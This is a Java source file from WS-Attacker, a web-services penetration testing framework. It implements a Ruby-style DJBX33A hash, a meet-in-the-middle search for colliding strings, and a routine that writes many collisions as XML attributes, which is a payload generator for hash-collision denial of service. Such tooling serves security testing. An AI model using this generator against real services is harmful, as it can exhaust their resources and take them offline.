/**
 * WS-Attacker - A Modular Web Services Penetration Testing Framework Copyright
 * (C) 2013 Christian Altmeier
 *
 * This program is free software; you can redistribute it and/or modify it under
 * the terms of the GNU General Public License as published by the Free Software
 * Foundation; either version 2 of the License, or (at your option) any later
 * version.
 *
 * This program is distributed in the hope that it will be useful, but WITHOUT
 * ANY WARRANTY; without even the implied warranty of MERCHANTABILITY or FITNESS
 * FOR A PARTICULAR PURPOSE. See the GNU General Public License for more
 * details.
 *
 * You should have received a copy of the GNU General Public License along with
 * this program; if not, write to the Free Software Foundation, Inc., 51
 * Franklin Street, Fifth Floor, Boston, MA 02110-1301, USA.
 */
package wsattacker.library.intelligentdos.hashdos;

import java.io.InputStream;
import java.nio.charset.Charset;
import java.util.HashMap;
import java.util.Scanner;
import java.util.Set;

import org.apache.commons.lang3.RandomStringUtils;

import wsattacker.plugin.dos.dosExtension.attackClasses.hashDos.CollisionInterface;

import com.google.common.collect.Sets;

/**
 * @author Christian Altmeier
 */
public class CollisionDJBX
    implements CollisionInterface
{

    private int lengthString = 10;

    private int lengthSuffix = 4;

    public int getLengthString()
    {
        return lengthString;
    }

    public void setLengthString( int lengthString )
    {
        this.lengthString = lengthString;
    }

    public int getLengthSuffix()
    {
        return lengthSuffix;
    }

    public void setLengthSuffix( int lengthSuffix )
    {
        this.lengthSuffix = lengthSuffix;
    }

    /**
     * Get Hash Value for String using DJBX33A Algorithm
     * 
     * @param s
     * @return
     */
    @Override
    public int getHash( String s )
    {

        // http://blade.nagaokaut.ac.jp/cgi-bin/scat.rb/ruby/ruby-talk/9645
        // register long len = RSTRING(str)->len;
        // register char *p = RSTRING(str)->ptr;
        // register int key = 0;
        // if (ruby_ignorecase) {
        // while (len--) {
        // key = key*65599 + toupper(*p);
        // p++;
        // }
        // }
        // else {
        // while (len--) {
        // key = key*65599 + *p;
        // p++;
        // }
        // }
        // key = key + (key>>5);

        byte[] byteArray = s.getBytes( Charset.defaultCharset() );
        int n = byteArray.length;
        int key = 0;
        for ( int i = 0; i < n; i++ )
        {
            int h = key;
            key = key << 10;
            for ( int ab = 0; ab < 6; ab++ )
            {
                key = ( key << 1 ) + h;
            }
            key = key + byteArray[i];

            // hash = ( ( hash * 65599 ) + byteArray[i];
            // hash = ( ( hash << 5 ) + hash ) + byteArray[i];
        }

        key = key + ( key >> 5 );
        return key;
    }

    public int hashForth( String s )
    {
        byte[] byteArray = s.getBytes( Charset.defaultCharset() );
        int n = byteArray.length;
        int key = 0;
        for ( int i = 0; i < n; i++ )
        {
            int h = key;
            key = key << 10;
            for ( int ab = 0; ab < 6; ab++ )
            {
                key = ( key << 1 ) + h;
            }
            key = key + byteArray[i];
        }

        return key;
    }

    public int hashBack( String s, int target )
    {
        byte[] byteArray = s.getBytes( Charset.defaultCharset() );
        int n = byteArray.length;
        int hash = target;
        for ( int i = n; i > 0; i-- )
        {
            hash = ( ( hash - byteArray[i - 1] ) * -1904545857 );
        }

        return hash;
    }

    /**
     * generates n Collisions for DJBX33A and writes result to sb All collisions are written in XML-Attribute Style
     * 
     * @param numberAttributes number of attributes to generate
     * @param sb StringBuilder that will hold the attributes
     */
    @Override
    public void genNCollisions( int numberAttributes, StringBuilder sb, boolean useNamespace )
    {

        Scanner scanner = null;
        try
        {
            InputStream is = CollisionDJBX.class.getResourceAsStream( "/RubyCollisions/RubyCollisions.txt" );
            scanner = new Scanner( is, Charset.defaultCharset().name() );

            String prefix = "";
            if ( useNamespace == true )
            {
                prefix = "xmlns:";
            }

            for ( int i = 0; i < numberAttributes; i++ )
            {
                String collision = scanner.nextLine();
                sb.append( prefix ).append( collision ).append( "=\"" ).append( collision ).append( "\" " );
            }

        }
        catch ( Exception e )
        {
            e.printStackTrace();
        }
        finally
        {
            if ( scanner != null )
            {
                scanner.close();
            }
        }
    }

    /**
     * get i-th ternaryCollisionString out of 2^n ternaryCollisionStrings since 3^n Elemnts can be generated result
     * string will have a length of 2*n chars 2*n since each Element is represented by 2 char string! How does it work
     * for n = 2 -> 2^2 = 9 possible strings? Algorithm generates 2*9 Matrix and replaces numbers with collision strings
     * aka table with ternary-Numbers row0: 00 row1: 01 row2: 10 row3: 11 for i = 2 -> 1th row is picked and created!
     * 
     * @param i i-th row out of 2^n rows
     * @param n exponent
     * @return String
     */
    @Override
    public String getCollisionString( int i, int n )
    {
        return "";
    }

    /**
     * Generates collisions for DJBX33X using the MeetInTheMiddle-Attack The Parameter "numberTrys" says how many times
     * the algorithm should test for a collision. At the end the number of found collsions is returned!
     * 
     * @param numberCollisions - in this case limited to 62^7 = 3,521614606×10¹² = 000000000
     */
    public Set<String> generateCollionsMeetInTheMiddle( long numberCollisions )
    {
        // generate Datastructures
        int targetHash = 0;

        int stringLength = getLengthString();
        int suffixLenth = getLengthSuffix();
        int postfix = stringLength - suffixLenth;

        System.out.println( "Start generateCollionsMeetInTheMiddle" );

        HashMap<Integer, String> lookupMapHashBack = createLookupMap( targetHash, suffixLenth );

        int pow = (int) Math.pow( 62, suffixLenth );
        System.out.println( "Done LookupTable with " + lookupMapHashBack.size() + " (" + pow + ") unique Values" );

        Set<String> resultSet = createCollisions( numberCollisions, postfix, lookupMapHashBack );


        return resultSet;
    }

    private Set<String> createCollisions( long numberCollisions, int postfix, HashMap<Integer, String> lookupMapHashBack )
    {
        int hashForthResult;
        // create random 7 byte Prefix-Strings and calculate HashForth-Value
        // Then test if HashForth-Value is equal to an index in lookuptable.
        // If match found do concat(7bytePrefix, 3ByteSuffix), which equals
        // the preimage resulting in:
        // h(preimage)=target
        Set<String> resultSet = Sets.newHashSet();
        while ( resultSet.size() < numberCollisions )
        {
            // create "random" { postfix } byte prefix
            String prefix = RandomStringUtils.randomAlphanumeric( postfix );

            // calculate HashForth value
            hashForthResult = hashForth( prefix );

            // check if attribute Starts with number -> ignore
            if ( !prefix.matches( "^[0-9]+[0-9a-zA-Z]*$" ) )
            {
                String match = lookupMapHashBack.get( hashForthResult );
                // check if match in Hashtable!
                if ( match != null )
                {
                    // check if prefix already in Final Result?

                    // save result to Hashtable - so we can check that not
                    // in twice
                    resultSet.add( prefix + match );
                }
            }
        }
        return resultSet;
    }

    private HashMap<Integer, String> createLookupMap( int targetHash, int length )
    {
        int hashBackResult;
        // fillup LookupTable with 62^{length} values
        HashMap<Integer, String> lookupMapHashBack = new HashMap<Integer, String>();
        int pow = (int) Math.pow( 62, length );
        for ( int i = 0; i < pow; i++ )
        {
            // create "random" {length} byte suffix
            String suffix = getIthNCharString( i, length );

            // Check if suffix already in Hashtable
            hashBackResult = hashBack( suffix, targetHash );
            if ( lookupMapHashBack.get( hashBackResult ) == null )
            {
                // calculate HashBack value +
                // save result to Hashtable!
                lookupMapHashBack.put( hashBackResult, suffix );
            }
        }
        return lookupMapHashBack;
    }

    /**
     * Gets the i-th AlphaNumeric-String out of a n char String Example: n = 3 -> 62^3 possible 3 char strings!
     * 
     * @param i
     * @param n
     * @return
     */
    public String getIthNCharString( int i, int n )
    {
        // init Bytes with collision Strings
        String ABC = "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ";

        // init empty ByteArray of correct Size for holding result!
        int numberElements = n;
        byte[] output = new byte[numberElements];
        for ( int j = 0; j < numberElements; j++ )
        {
            output[j] = '0';
        }

        // do calculation
        int divisor = i;
        int rest = 0;
        int count = numberElements - 1;
        while ( divisor != 0 )
        {
            rest = divisor % 62;
            divisor = divisor / 62;
            output[count] = (byte) ABC.charAt( rest );
            count -= 1;
        }
        return new String( output, Charset.defaultCharset() );
    }

}